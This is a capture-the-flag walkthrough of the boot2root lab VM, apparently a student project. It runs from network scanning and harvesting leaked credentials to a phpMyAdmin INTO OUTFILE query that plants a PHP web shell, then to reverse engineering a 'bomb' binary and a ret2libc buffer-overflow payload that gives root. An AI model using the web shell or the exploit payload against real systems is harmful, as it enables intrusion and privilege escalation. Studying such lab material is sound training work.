# Writeup 1 - CTF mode

## Step 1 - Nmap

We don't see the ip of the boot2root vm, so we have to find it on our network.
We get the **ip address** of **our computer** and the **netmask of the network** with **ifconfig**:

```sh
➜  boot2root ifconfig               
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.128  netmask 255.255.255.0  broadcast 192.168.1.255
```

We then do a **ping scan** on the **home network** with nmap, and we can see the ip of the boot2root vm. We then do a **port scan** on **its ip address**:
```sh
➜  boot2root nmap -sn 192.168.1.128/24    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 16:39 CET
[...]
Nmap scan report for 192.168.1.76
Host is up (0.00079s latency).
[...]
➜  boot2root nmap -Pn 192.168.1.76
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 16:40 CET
Nmap scan report for 192.168.1.76
Host is up (0.00037s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```

So we can see that there **6 open ports**: one for **ftp**, one for **ssh**, two for **http and https**, meaning there is a **webserver**, and 2 for **imap and imaps**, handling the **webmail.**

---

## Step 2 - Dirb

Now that we know that there is a **webserver**, we use **dirb** to test the possible urls on the https://ip-address, and we find out some interesting ones:

```bash
➜  boot2root dirb https://192.168.1.76

---- Scanning URL: https://192.168.1.76/ ----
==> DIRECTORY: https://192.168.1.76/forum/
==> DIRECTORY: https://192.168.1.76/phpmyadmin/
==> DIRECTORY: https://192.168.1.76/webmail/

---- Entering directory: https://192.168.1.76/forum/ ----
==> DIRECTORY: https://192.168.1.76/forum/images/
==> DIRECTORY: https://192.168.1.76/forum/includes/
==> DIRECTORY: https://192.168.1.76/forum/js/
==> DIRECTORY: https://192.168.1.76/forum/lang/
==> DIRECTORY: https://192.168.1.76/forum/modules/
==> DIRECTORY: https://192.168.1.76/forum/templates_c/
==> DIRECTORY: https://192.168.1.76/forum/themes/
==> DIRECTORY: https://192.168.1.76/forum/update/

---- Entering directory: https://192.168.1.76/phpmyadmin/ ----
==> DIRECTORY: https://192.168.1.76/phpmyadmin/js/
==> DIRECTORY: https://192.168.1.76/phpmyadmin/locale/
==> DIRECTORY: https://192.168.1.76/phpmyadmin/themes/

---- Entering directory: https://192.168.1.76/webmail/ ----
==> DIRECTORY: https://192.168.1.76/webmail/config/
==> DIRECTORY: https://192.168.1.76/webmail/images/
==> DIRECTORY: https://192.168.1.76/webmail/plugins/
==> DIRECTORY: https://192.168.1.76/webmail/src/
==> DIRECTORY: https://192.168.1.76/webmail/themes/
```

---

## Step 3 - Forum  

We go on the forum page (https://192.168.1.76/forum/), running on mylittleforum, and we can see several threads. In the **"Probleme login ?"** one, by lmezard, we can see some **logs**.  
If we look into them, at some point we can see a **clear password** in the login section, and an authenticated session right after:

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
[...]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

So we try to **log in the forum** as the user **lmezard** with the **!q\]Ej?\*5K5cy\*AJ** password, and it works.

---

## Step 4 - Webmail

When we go on the profile of lmezard, we can see an **email address**:
```
laurie@borntosec.net 
```

We try to **log in the webmail** (https://192.168.1.76/webmail/) with this email address and the password from the logs, and we get access to the user's mailbox.
There, we find an email named **DB Access** with **a root user and a password**:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

So we can suppose we can use those credentials to get access to the phpmyadmin database as root.

---

## Step 5 - Phpmyadmin

We log on the https://192.168.1.76/phpmyadmin page with those credentials, and we get access to the database as root.

After searching for a bit, we can see that there is a feature that allows us to run SQL queries in the SQL section of the databases.

On there : https://github.com/nullbind/Other-Projects/blob/master/random/phpMyAdminWebShell.sql , we found this query that allows us to open a shell in the browser:
```SQL
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/payload.php'
```

But if we try to execute it, we get an error specifying us that we don't have the rights to create/write on this file. 

So we need to find a file or folder where we have the write/create rights. When we look at the dirb results earlier, we have a list of potential folders where we could have those rights.

When we look at the admin update page in the forum (after giving lmezard the admin rights on the BDD), or when we read the installation process of mylittleforum on github (https://github.com/ilosuna/mylittleforum), we can see that the folder **templates_c** is supposed to have these rights:

```
the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) 
```

We see it on the dirb results too, so we use it in our query:

```SQL
SELECT [...]
INTO OUTFILE '/var/www/forum/templates_c/payload.php'
```

The SQL query works, and when we go at the address https://192.168.1.76/forum/templates_c/payload, we can see that it opens an interactive shell.

---

## Step 6 - User www-data

In the interactive shell, we can see that **we are the user www-data**, and when we list the files in the **/home** folder, we see a folder named **LOOKATME** owned by the www-data user.

```
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
```

There is a file named **password** in this folder, which holds:

```
lmezard:G!@M6f4Eatau{sF"
```

However when we look at the **sshd_config** file, we can see that there are **only 4 users allowed** to connect in ssh, and lmezard is not one of them.

```
AllowUsers ft_root zaz thor laurie
```

---

## Step 7 - FTP

We try those credentials on the port 21, used for FTP and it works.

There we see 2 files, fun and README, so we use the **get** command to fetch them on our machine.

```
➜  laurie git:(main) ✗ file fun
fun: POSIX tar archive (GNU)
```

We see that the fun file is actually a **tar** file, so we use `tar -xvf fun` to un-archive them.

When we look at those files, we can see that each file is a little piece of a bigger C file, and if we read them all together with `cat * | less` we can see this function inside:

```c
int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12());
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```

So we have to **find the getmes functions** inside those files. Some of these functions are all in the **same files** while some are **split**. In each file, there is **a comment with a number**, that gives us a hint to find the following file.  

We wrote a **script** to facilitate this (see in the *Ressources/ftp* folder), and at the end we get the password for laurie:
```
 plain:    Iheartpwnage
 sha256:   330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

---

## Step 8 - Laurie / The Bomb

We know laurie is an allowed user on the sshd_config file, so we connect ourself on the boot2root vm in ssh with the credentials:   **laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4**  

There we see a binary named **bomb**, and a README with some hints. The bomb has **6 stages**, and **each stage needs a password to get to the next stage**. At the end, **all the passwords combined without spaces** will **form the password** for the user **thor**.

### Phase 1

```bash
$> strings bomb
```
See "Public speaking is very easy."

### Phase 2

```bash
0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
```

First number need to be 1.

After this there is a loop for the 5 remaining number.

The math is as following :

```bash
int	loop = 1;
int n = 1 (premier nombre)
do
{
	var1 = loop + 1;
	var2 = var2 * (n + loop * 4 - 4);
	if (n + loop * 4 != var 2)
		explode_bomb ();
	loop++;
}
while (loop <= 5);
```

We can notice that there is a loop reaching consecutively 1, 2, 3, 4, 5, 6.
And our password is equal to : 1!, 2!, 3!, 4!, 5!.

Our 5 numbers : 1 2 6 24 120 720

### Phase 3

We know from the hint that the second element is "b".

                   n1 c1 n2
It ask for this : "%d %c %d"

```bash
And check for this
if (n1 <= 7)      =>                    0x08048bc9 <+49>:	cmp    DWORD PTR [ebp-0xc],0x7
if (c1 == 0x62)   =>					0x08048c00 <+104>:	mov    bl,0x62
if (n1 == 0xd6)   =>					0x08048c02 <+106>:	cmp    DWORD PTR [ebp-0x4],0xd6
```

So with 1 b 214 we pass it.

### Phase 4

```bash
uint32_t func4 (int32_t arg_8h) {
    int32_t var_18h;
    do {
label_0:
        ebx = *((ebp + 8));
        if (ebx <= 1) {
            goto label_1;
        }
        eax = func4 (ebx - 1);
    } while (1);
    esi = eax;
    eax = func4 (ebx - 2);
    goto label_0;
    eax += esi;						#<= func4(n - 1) + func4(n - 2)
    goto label_2;
label_1:
    eax = 1;
label_2:
    esp = ebp - 0x18;
    return eax;
}
```

ret = eax + esi = func(n - 1) + func(n - 2)
This is fibonacci function.

In phase_4 function :
```bash
eax = func4 (eax);
    if (eax != 0x37) {
        explode_bomb ();
    }
```
If func4 doesn't return 0x37 or 55(dec) it explodes. But fibo(10) = 55 actually
explodes. Let;s take a look at this part in func4:
```bash
if (ebx <= 1) {
	goto label_1;
}
```
The process stopped when ebx = 1, howerver the real fibo stops in many ways (see
fibo in scripts dir) and not putting the others stop conditions shift by one the list so it is not
func4(10) = 55 but fibo(9) = 55.

password: 9

### Phase 5

It encrypt a string of 6 character length and compare it to "giants"

The encryption do as follow :

```bash
A = 0x41
0x41 & 0xf = 1
esi = "isrveawhobpnutfg";
str[index] = esi[1];

##after the encryption the alphabet representation is as follow :
abcdefghijklmnopqrstuvwxyz
-----
srveawhobpnutfgisrveawhobp
```

giants = opekmq
giants = opekma

### Phase 6

We know :
- we need 6 numbers
- each between 1 & 6
- first is 4
- something about their position matter

A chain list exists to compare our input by checking stack address where our
input is stored.

### Result

Here is a summary of the passwords we found for the 6 stages and the combined one at the end:

```bash
PHASE 1:    Public speaking is very easy.
PHASE 2:    1 2 6 24 120 720
PHASE 3:    1 b 214
PHASE 4:    9
PHASE 5:    opekmq
PHASE 6:    4 2 6 3 1 5

PASSWORD:   Publicspeakingisveryeasy.126241207201b2149opekmq426315
```

However, this password doesn't work, and according to slack, we need to change `n-1` with `n-2`, so the password is: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

---

## Step 9 - Thor / Turtle

We use the second password to connect ourself as thor, and we see a README and a **turtle** file, which contains **instructions** to go **forward**, **backward**, **right or left** at certain angles.

We know that **Turtle** is a **Python feature** like a **drawing board**, which lets us command a turtle to draw all over it, which would fit with the file we found.

So we wrote a **python script** to **translate** and **read the file with this feature**, and it **prints the word 'SLASH'** (see the script in our scripts folder).

At the end of the turtle file, we see this message:

```
Can you digest the message? :)
```

So we can suppose we need to process it through a message digest algorithm like md5, which gives us: **646da671ca01bb5d84dbb5fb2238dc8e**

---

## Step 10 - Zaz / Exploit-me

We try the digest as zaz password and it works. We can see in his home folder a **binary** called **exploit-me**, and we see it **copies** the **input** we give it as the first argument **on its stack without verification**.

We use both the pattern generator on this website: https://wiremask.eu/tools/buffer-overflow-pattern-generator/? and gdb to calculate the offset of bytes after which the program segfaults/rewrite on eip, and it's 140.

We use a **ret2libc attack** to open a shell as root, since **exploit-me** is **owned by root** and has the **suid**.

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find 0xb7e6b060, +9999999, "/bin/sh"
0xb7f8cc58
```

The system address will replace the eip, and the "/bin/sh" address will be use as its argument.
We now need to write these addresses in little endian, so here is our payload:

```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��AAAAX���
# whoami
root
# id  
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```

And we are root!
